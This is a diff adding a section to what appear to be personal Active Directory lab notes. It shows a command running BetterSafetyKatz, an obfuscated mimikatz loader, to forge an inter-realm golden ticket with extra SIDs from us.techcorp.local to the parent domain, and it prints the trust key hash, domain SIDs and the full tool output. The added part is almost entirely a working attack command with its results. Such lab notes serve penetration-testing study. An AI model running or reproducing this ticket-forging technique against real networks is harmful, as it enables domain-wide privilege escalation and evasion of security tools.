@@ -245,3 +245,45 @@ Domain: EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)
 
 mimikatz #
 ```
+
+Create golden ticket from techcorp.local stored on kirbi file with the bianry Betterkatz.exe on the attacker mcahine with a high privileges terminal:
+
+```
+C:\Windows\system32>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946 /rc4:4de80aa031eab75dba76146cdad5cf58 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
+[+] Randomizing strings in memory
+[+] Suicide burn before CreateThread!
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946 /rc4:4de80aa031eab75dba76146cdad5cf58 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi
+User      : Administrator
+Domain    : us.techcorp.local (US)
+SID       : S-1-5-21-210670787-2521448726-163245708
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-2781415573-3701854478-2406986946 ;
+ServiceKey: 4de80aa031eab75dba76146cdad5cf58 - rc4_hmac_nt
+Service   : krbtgt
+Target    : techcorp.local
+Lifetime  : 2/28/2023 11:44:42 AM ; 2/25/2033 11:44:42 AM ; 2/25/2033 11:44:42 AM
+-> Ticket : C:\AD\Tools\trust_tkt.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+mimikatz(commandline) # exit
+Bye!
+
+C:\Windows\system32>
+```
